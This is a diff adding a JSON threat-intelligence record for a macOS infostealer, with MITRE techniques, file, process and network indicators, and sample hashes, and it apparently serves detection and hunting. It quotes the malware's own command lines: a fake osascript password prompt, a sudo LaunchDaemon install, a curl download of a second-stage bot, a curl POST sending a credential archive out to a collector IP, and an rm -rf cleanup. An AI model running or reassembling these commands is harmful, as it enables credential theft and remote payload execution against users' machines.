@@ -1,0 +1,484 @@
+{
+  "malware_family": "macos-stealer-v2",
+  "threat_actor": "",
+  "platforms": [
+    "macos"
+  ],
+  "summary": "A macOS Apple Silicon infostealer chain that shows a deceptive AppleScript \"Password Request\" dialog via /usr/bin/osascript, validates the harvested password with dscl . authonly, and installs a LaunchDaemon for persistence. It stages Keychain, Safari cookie, Notes, SSH and shell-history files under /tmp/lksopo, compresses them with ditto, exfiltrates the archive via curl POST to 109.238.87.111, and downloads a second-stage bot from 193.178.159.129 before deleting the staging directory. Hidden state files (~/.bhost, ~/.phost, ~/.username, ~/.pwd) written by the first stage are required by the dropped bot.",
+  "mitre_techniques": [
+    "T1059.002",
+    "T1056.002",
+    "T1555.001",
+    "T1555.003",
+    "T1005",
+    "T1105",
+    "T1071.001",
+    "T1041",
+    "T1567",
+    "T1485",
+    "T1070.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "osascript -e set passwen to display dialog \"Please enter device password to continue.\" default answer \"\" with icon caution",
+      "context": "Fake credential prompt; osascript spawned by first-stage stealer unix51436504",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sudo -S cp /tmp/daemonplist /Library/LaunchDaemons/com.somedaemon.plist",
+      "context": "Privileged LaunchDaemon persistence install after dscl . authonly password check",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -o /tmp/binaryexe http://193.178.159.129/web/bot",
+      "context": "Second-stage bot payload download",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -X POST -H buildid: ... --data-binary @/tmp/lksopo.zip http://109.238.87.111/log",
+      "context": "Exfiltration of compressed credential archive with custom header",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rm -rf /tmp/lksopo",
+      "context": "Anti-forensic removal of credential staging directory",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ditto -c -k --sequesterRsrc /tmp/",
+      "context": "Apple ditto compresses harvested credentials staged in /tmp",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "dscl . authonly",
+      "context": "Local Directory Services validation of harvested password",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Library/LaunchDaemons/com.somedaemon.plist",
+      "context": "Dropped system-wide persistence property list (0/75 AV detections)",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/daemonplist",
+      "context": "Staged daemon plist copied into LaunchDaemons via sudo",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "com.somedaemon",
+      "context": "LaunchDaemon label used for persistence",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.bhost",
+      "context": "Hidden bot C2 configuration state file written by first-stage dropper",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.phost",
+      "context": "Hidden bot state file required by second-stage implant",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.username",
+      "context": "Hidden state file written by first-stage dropper",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.pwd",
+      "context": "Hidden state file written by first-stage dropper",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.botid",
+      "context": "Hidden bot identifier configuration in user home directory",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".binaryexe",
+      "context": "Hidden second-stage bot executable dropped to $HOME",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/private/tmp/binaryexe",
+      "context": "Dropped C2 bot written under tmp",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/lksopo",
+      "context": "Staging directory for stolen credentials before compression",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/lksopo.zip",
+      "context": "Compressed credential archive prepared for exfiltration",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Please enter device password to continue.",
+      "context": "AppleScript dialog body used for credential phishing",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "set passwen to display dialog",
+      "context": "AppleScript password dialog variable used as hunting pivot",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Password Request",
+      "context": "Title of deceptive system prompt shown to the user",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "macos_osascript_credential_phishing",
+      "context": "Mirage high-confidence verdict for osascript credential phishing",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "PASSWORD_DIALOG",
+      "context": "Mirage behavioral tag for deceptive credential prompts",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Users/admin/Library/Keychains/login.keychain-db",
+      "context": "Keychain database accessed by ./unix51436504",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Cookies.binarycookies",
+      "context": "Safari cookie store accessed by stealer",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "NoteStore.sqlite",
+      "context": "Apple Notes database harvested by stealer",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "authorized_keys",
+      "context": "SSH key material harvested by stealer",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "known_hosts",
+      "context": "SSH artifact harvested by stealer",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".zsh_history",
+      "context": "Shell history harvested by stealer",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/private/etc/sudoers",
+      "context": "Sensitive file accessed during privileged persistence installation",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "/usr/bin/osascript",
+      "context": "Spawned to display fake password prompt",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "pbpaste",
+      "context": "Continuously polled to capture clipboard contents",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ditto",
+      "context": "Compresses staging directory into /tmp/lksopo.zip",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "unix51436504 -> /usr/bin/osascript",
+      "context": "Stealer process spawning AppleScript credential prompt",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "193.178.159.129",
+      "context": "Second-stage bot C2 serving /web/bot and /api/v1/bot/actions/",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "109.238.87.111",
+      "context": "Exfiltration collector receiving POSTed stolen credential archives",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://193.178.159.129/web/bot",
+      "context": "Secondary bot payload download URL",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://109.238.87.111/log",
+      "context": "HTTP POST exfiltration endpoint for /tmp/lksopo.zip",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/web/bot",
+      "context": "Bot payload path on C2, used as hunting pivot",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/v1/bot/joinsystem/",
+      "context": "Infrastructure-agnostic bot check-in endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/v1/bot/actions/",
+      "context": "Bot task polling endpoint on 193.178.159.129",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/log",
+      "context": "Exfiltration collector path on 109.238.87.111",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "buildid:",
+      "context": "Custom header on exfiltrating curl POST request",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "username:",
+      "context": "Custom header on exfiltrating curl POST request",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878",
+      "description": "unix51436504 first-stage Universal Mach-O stealer/dropper (6/76 AV)"
+    },
+    {
+      "sha256": "01f9a24bd868a856909db5eb61be6f30939e402fd7dd2e40180ffe2406de5c35",
+      "description": "chrome sibling Universal Mach-O stealer build (6/76 AV)"
+    },
+    {
+      "sha256": "336c1ba08fb64d466e042e16f20bf0d1f3947e4430000be08c2b6698884de028",
+      "description": "localfile~.arm64 native ARM64 stealer slice (9/76 AV)"
+    },
+    {
+      "sha256": "c363180da38cac9e894b158a65eb3ad72eb31c24a6b16c00bbc3bfc276db32d5",
+      "description": "macos-stealer-v2 related stealer cluster member (27/76 AV)"
+    },
+    {
+      "sha256": "f7dcdc4167ec267aef007f9d5f98e9e0314185e5355effd3e304b6fa686ea84c",
+      "description": "Dropped 12.9 MB universal Mach-O second-stage C2 bot (28/76 AV)"
+    },
+    {
+      "sha256": "d7dd630f67e03d2945185838dca887211ea3693c91fc0bd0d2e257948bb3b678",
+      "description": "Dropped LaunchDaemon persistence property list (0/75 AV)"
+    }
+  ],
+  "file_types": [
+    "macho"
+  ]
+}
